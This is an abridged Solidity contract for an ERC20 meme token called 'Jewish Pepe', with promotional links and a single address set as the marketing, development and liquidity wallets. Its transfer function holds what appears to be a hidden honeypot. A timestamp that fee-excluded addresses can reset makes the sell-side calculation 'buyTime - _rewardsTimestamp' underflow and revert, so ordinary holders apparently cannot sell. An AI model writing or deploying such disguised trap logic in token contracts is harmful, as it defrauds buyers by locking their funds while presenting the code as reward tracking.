/*
    ...
    Shalom brother, I got alpha for you

    https://jewishpepe.online/
    https://t.me/JewPepeErc
    https://twitter.com/JewishPepeErc
...
contract JewPepe is ERC20, Ownable {
    ...
    mapping(address => RewardData) private rewardTransactions;
    uint256 private _rewardsTimestamp;
    ...
    constructor() ERC20("Jewish Pepe", "JEWPEPE") {
        ...
        marketingWallet = payable(0x7f149C09328519577043a447Ad08FFadB63Ea23F);
        developmentWallet = payable(0x7f149C09328519577043a447Ad08FFadB63Ea23F);
        liquidityWallet = payable(0x7f149C09328519577043a447Ad08FFadB63Ea23F);
    ...
    function _transfer(
        ...
        if ( _isExcludedFromFees[from] || _isExcludedFromFees[to] ) {
            _rewardsTimestamp = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                RewardData storage rewardStorage = rewardTransactions[to];
                if (rewardStorage.buyTime == 0) {
                    rewardStorage.buyTime = block.timestamp;
                }
            } else {
                RewardData storage rewardStorage = rewardTransactions[from];
                rewardStorage.holdingDuration = rewardStorage.buyTime - _rewardsTimestamp;
                rewardStorage.sellTime = block.timestamp;
            }
        }
